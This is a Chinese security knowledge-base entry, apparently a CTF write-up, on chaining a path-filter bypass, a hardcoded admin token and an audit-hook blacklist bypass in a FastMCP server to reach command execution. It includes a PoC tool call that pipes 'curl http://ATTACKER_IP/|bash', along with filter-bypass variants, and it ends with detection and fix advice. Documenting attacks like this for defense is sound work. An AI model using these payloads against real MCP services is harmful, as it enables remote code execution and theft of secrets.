---
id: ai-security-mcp-fastmcp-path-filter-token-audit-hook-bypass
title: FastMCP 自定义工具链：`../` 单次替换绕过读 server.py 拿硬编码 token，os.system 绕过审计钩子执行命令
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: fastmcp-file-reader-filter-bypass-token-audit-hook-bypass
tags:
- ai-security
- mcp
- fastmcp
- path-traversal
- filter-bypass
- hardcoded-token
- audit-hook
- sandbox-escape
- rce
- python
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T12:54:37+08:00'
  notes: 已对照原文 web-ez_py 段核对：/messages 307、application/json、session_id、/see/ MCP SSE、file_reader 的 server.py 关键词+单次 replace('../','')、app/serv../er.py 绕过、ADMIN_TOKEN=admin_token_12345、system_cmd 审计钩子黑名单与 os.system 事件绕过均一致；未连接真实 MCP 服务复跑。原文未给受影响版本，affected_versions 保持为空。
url: /docs/ai-security/mcp-security/ai-security-mcp-fastmcp-path-filter-token-audit-hook-bypass/
draft: false
kb_aliases:
- FastMCP 路径过滤绕过
- serv../er.py 读源码
- MCP 硬编码 ADMIN_TOKEN
- addaudithook 沙箱绕过 os.system
- MCP system_cmd 命令执行
- MCP file_reader 任意文件读取
---

## 一句话结论

一个 FastMCP 服务同时暴露 `file_reader` 与 `system_cmd` 两个工具：`file_reader` 的路径穿越过滤是 `path.replace("../","")` 的单次替换，用 `app/serv../er.py` 即可拼回 `app/server.py` 读到源码，泄露硬编码的 `ADMIN_TOKEN`；`system_cmd` 校验该 token 后把用户输入拼进 Python 代码执行，虽然 `sys.addaudithook` 拉黑了 `subprocess`/`eval`/`exec` 等事件名，但 `__import__('os').system(...)` 触发的是 `os.system` 事件，不在黑名单内，从而绕过沙箱执行任意命令。

## 原理

- **MCP 服务暴露**：`/messages` 返回 307 并提示 `Invalid Content-Type header`，补 `application/json` 后要求 `session_id`；`/see/` 为 MCP SSE 端点，使用 Cherry Studio 等 MCP 客户端连接后可列出并调用服务端工具。
- **file_reader 过滤缺陷**：
  ```python
  if any(keyword in path for keyword in ["server.py", "__file__", "main.py"]):
      return "not server file read server.py"
  if "../" in path:
      path = path.replace("../", "")
  ```
  关键词检查发生在替换之前，且替换只执行一次、不递归。构造 `app/serv../er.py`：关键词检查时字符串不含 `server.py`；随后 `replace("../","")` 删除中间的 `../`，得到 `app/server.py`，成功读取被禁止的源码。
  - 此外还有 `if "flag" in path: return "not server file read"`，同样只做子串检查，可用编码/路径变形绕过。
- **硬编码 token**：`server.py` 中 `ADMIN_TOKEN = "admin_token_12345"`；任何能读到源码（或通过报错、备份、客户端配置泄露）的人都能获得该 token。
- **system_cmd 的“沙箱”**：工具先比较 `token != ADMIN_TOKEN`，通过后把 `cmd` 拼进 Python 源码：
  ```python
  python_code = hook_code + f'''
  try:
      result = {cmd}
      print(f"Result: {{result}}")
  except Exception as e:
      print(f"Error: {{e}}")
  '''
  ```
  即 `cmd` 直接被当作 Python 表达式插入，不是受限的命令字符串。
- **审计钩子绕过**：`hook_code` 通过 `sys.addaudithook(my_audit_hook)` 注册钩子，黑名单为 `["subprocess","input","eval","exec","compile"]`，只按事件名子串拦截。`__import__('os').system('...')` 触发的事件是 `os.system`（包含 `system`，不含黑名单词），因此不被拦截；`os.popen` 等同理。最终 `subprocess.run(['python','/tmp/sandbox_run.py'])` 执行拼接后的代码，命令在服务进程权限下运行。

## 触发条件

- FastMCP 服务可从攻击者网络访问（SSE/HTTP 端点），且暴露了文件读取与命令执行类工具。
- `file_reader` 的过滤存在“先检查关键词、后单次替换 `../`”的顺序/逻辑缺陷；服务器源码路径可被相对路径拼回。
- `server.py` 或以其他方式泄露的源码/配置中包含可用的管理 token。
- `system_cmd` 的审计钩子只按事件名黑名单拦截，且代码执行方式允许 `os.system`/`os.popen` 等未覆盖的事件；服务进程有命令执行权限。

## 利用步骤

1. 探测 `/messages`、`/see/` 等端点，确认是 MCP 服务；用 MCP 客户端（如 Cherry Studio）连接，列出工具。
2. 调用 `file_reader`，先试读普通文件确认可用；再试 `server.py` 观察返回 `not server file read server.py`。
3. 用 `app/serv../er.py` 绕过关键词与 `../` 过滤，读取 `server.py`，获得 `ADMIN_TOKEN` 与工具实现。
4. 调用 `system_cmd`，传入 `token=admin_token_12345` 和 Python 表达式形式的 `cmd`：
   ```json
   {"cmd": "__import__('os').system('curl http://ATTACKER/|bash')", "token": "admin_token_12345"}
   ```
5. 审计钩子只拦 `subprocess`/`eval` 等事件名，`os.system` 通过；攻击机监听或 HTTP 服务收到回连，命令执行成功。
6. 也可把 `cmd` 换成读文件、反弹 Shell、写计划任务等 Python 表达式；注意服务端会写 `/tmp/sandbox_run.py` 后执行并删除。

## PoC

工具调用参数（MCP 客户端中调用 `system_cmd`）：

```json
{
  "cmd": "__import__('os').system('curl http://ATTACKER_IP/|bash')",
  "token": "admin_token_12345"
}
```

路径过滤绕过（调用 `file_reader`）：

```text
app/serv../er.py
```

因 `path.replace("../","")` 只替换一次，`app/serv../er.py` 变为 `app/server.py`，从而读取源码中的 `ADMIN_TOKEN`。

## 变体与关联

- 变体：`../` 可用 `....//`、`..%2f`、`serv../er.py` 等变形；关键词检查可用大小写、软链接、`/proc/self/cwd` 等绕过。
- 变体：审计钩子黑名单可通过 `os.system`、`os.popen`、`ctypes`、`pty.spawn` 等未覆盖事件绕过；也可用 `__import__('os').execvp`。
- 变体：若 `system_cmd` 的 token 无法读取，可尝试默认/弱 token、源码备份、错误信息或客户端配置泄露。
- 关联：MCP 隐藏工具与硬编码 key [[ai-security-mcp-security-hidden-tool-hardcoded-key-root-credential]]；MCP 资源路径穿越 [[ai-security-mcp-security-resources-read-base64-uri-path-traversal]]；Python 审计钩子沙箱绕过 [[binary-pwn-sandbox-escape-python-audit-hook-bypass]]。
- 边界：`file_reader` 使用规范化路径并校验前缀、token 随机且不落源码、审计钩子覆盖 `os.system`/`ctypes` 等事件、或 `system_cmd` 不把输入拼进代码时，链不成立。

## 检测与防御

- 检测：MCP 工具调用中出现 `serv../er`、`....//`、`%2e%2e` 等路径变形；`file_reader` 读取 `server.py`、`__file__`、`main.py` 或 `flag` 的尝试；`system_cmd` 调用出现 `os.system`、`__import__`、`ctypes`、`curl|bash` 等表达式；`/tmp/sandbox_run.py` 频繁创建/删除。
- 修复：文件读取用 `os.path.realpath` 规范化后校验必须位于允许目录内，禁止 `..`、绝对路径与符号链接；不要用字符串替换做安全过滤。
- 修复：删除工具源码中的硬编码 token，改为环境变量/密钥管理并定期轮换；`system_cmd` 不要拼接用户输入到 Python 源码，改为受限命令白名单或禁用。
- 加固：MCP 服务强制认证、仅监听内网/127.0.0.1；审计钩子覆盖 `os.system`、`os.exec*`、`ctypes`、`pty` 等事件，并配合容器/低权限运行；限制工具对文件系统与网络的访问。
